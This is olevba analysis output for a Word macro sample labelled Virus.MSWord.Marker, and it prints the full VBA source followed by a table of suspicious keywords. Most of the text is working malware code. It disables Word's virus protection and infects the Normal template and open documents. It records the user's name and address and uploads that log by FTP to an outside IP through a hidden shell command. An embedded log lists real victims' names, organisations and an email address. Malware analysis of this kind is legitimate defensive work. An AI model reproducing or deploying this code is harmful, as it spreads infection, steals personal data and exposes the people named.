olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-748a4b3e94d6be0a0e33296dfefa755ef98273e7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-748a4b3e94d6be0a0e33296dfefa755ef98273e7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FNORD()
  
  
  
  
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
  
x = 0
toast = "cl" + "ass" + ".sys"
tst = "Sub " + "Auto" + "Open"
tost = "Sub " + "View" + "VB" + "Code"
toad = "Tools" + "Macro"
  
Set doc = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  
If (doc.Find("AutoClose", 0, 0, 1000, 80) And doc.Find(toast, 0, 0, 1000, 80)) Then
    Startm = doc.ProcStartLine("AutoClose", vbext_pk_Proc)
    Length = doc.ProcCountLines("AutoClose", vbext_pk_Proc)
    doc.DeleteLines Startm, Length
    x = 1
End If
  
If (doc.Find(toad, 0, 0, 1000, 80)) Then
    Startm = doc.ProcStartLine(toad, vbext_pk_Proc)
    Length = doc.ProcCountLines(toad, vbext_pk_Proc)
    doc.DeleteLines Startm, Length
    x = 1
End If
  
If x = 1 Then
    MsgBox "The Class macro virus was removed from your Normal.dot"
End If
  
  
For i = 1 To Documents.Count
    x = 0
    Set doc = Documents(i).VBProject.VBComponents.Item(1).CodeModule
  
    If (doc.Find(tst, 0, 0, 1000, 80) And doc.Find(toast, 0, 0, 1000, 80)) Then
        Startm = doc.ProcStartLine("AutoOpen", vbext_pk_Proc)
        Length = doc.ProcCountLines("AutoOpen", vbext_pk_Proc)
        doc.DeleteLines Startm, Length
        x = 1
    End If
  
    If (doc.Find(tost, 0, 0, 1000, 80)) Then
        Startm = doc.ProcStartLine("ViewVBCode", vbext_pk_Proc)
        Length = doc.ProcCountLines("ViewVBCode", vbext_pk_Proc)
        doc.DeleteLines Startm, Length
        x = 1
    End If
  
    If x = 1 Then
  
        If doc.CountOfLines = 11 Then
            doc.DeleteLines 1, 11
        End If
  
        MsgBox "The class macro virus was removed from the document " + Documents(i).Name
    End If
  
Next i
End Sub
Sub AutoClose()
  
  
    Call FNORD
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 04:38:36  - Wednesday, 3 Feb 1999
' Lisa Macbeth
'



' 03:39:47  - Monday, 8 Feb 1999
' DTIR
'



' 11:44:45  - Friday, 12 Feb 1999
' DTIR
'



' 11:29:11  - Thursday, 4 Mar 1999
' biddleg
'



' 09:15:51  - Monday, 8 Mar 1999
' carroljj
'



' 03:22:22  - Thursday, 11 Mar 1999
' Michelle hopgood
'



' 08:33:21  - Friday, 12 Mar 1999
' Michelle Leavers
'



' 12:14:27 PM - Friday, 19 Mar 1999
' Avert
'



' 02:35:57 odp. - pondělí, 14 VI 1999
' Lena
' Kontakt: rincewind_mg@hotmail.com



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

